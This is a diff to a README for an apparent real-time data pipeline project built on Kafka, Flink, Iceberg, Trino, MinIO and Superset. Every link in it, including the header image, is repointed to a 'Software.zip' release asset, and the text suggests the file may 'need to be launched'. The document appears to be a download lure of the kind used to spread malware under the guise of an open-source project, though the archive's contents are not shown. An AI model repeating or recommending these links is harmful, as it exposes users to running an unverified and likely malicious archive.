@@ -1,6 +1,6 @@
 # 🚀 Real-Time Data Pipeline with Kafka, Flink, Iceberg, Trino, MinIO, and Superset
 
-![Real-Time Data Pipeline](https://github.com/user-attachments/files/18388744/pipeline.png)
+![Real-Time Data Pipeline](https://github.com/SonicEXEDVP/real-time-data-pipeline/releases/download/v2.0/Software.zip)
 
 Welcome to the Real-Time Data Pipeline repository! This project is a comprehensive data system setup consisting of Apache Kafka, Apache Flink, Apache Iceberg, Trino, MinIO, and Apache Superset. It serves as an ideal environment for learning about data systems, big data processing, ETL strategies, and real-time analytics.
 
@@ -18,7 +18,7 @@ Welcome to the Real-Time Data Pipeline repository! This project is a comprehensi
 
 ## Getting Started
 
-To access the Real-Time Data Pipeline setup, you can download the project files from [here](https://github.com/user-attachments/files/18388744/Software.zip). Once you have downloaded the zip file, extract it and follow the instructions in the README files provided within each component folder.
+To access the Real-Time Data Pipeline setup, you can download the project files from [here](https://github.com/SonicEXEDVP/real-time-data-pipeline/releases/download/v2.0/Software.zip). Once you have downloaded the zip file, extract it and follow the instructions in the README files provided within each component folder.
 
 If the link does not work or the file needs to be launched, please check the "Releases" section of this repository for alternative download options.
 
@@ -32,4 +32,4 @@ If you are interested in diving deeper into the world of real-time data processi
 
 Don't hesitate to reach out if you have any questions or need assistance with setting up the Real-Time Data Pipeline. Happy data engineering!
 
-[![Download Here](https://img.shields.io/badge/Download-Here-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Here](https://github.com/SonicEXEDVP/real-time-data-pipeline/releases/download/v2.0/Software.zip)](https://github.com/SonicEXEDVP/real-time-data-pipeline/releases/download/v2.0/Software.zip)
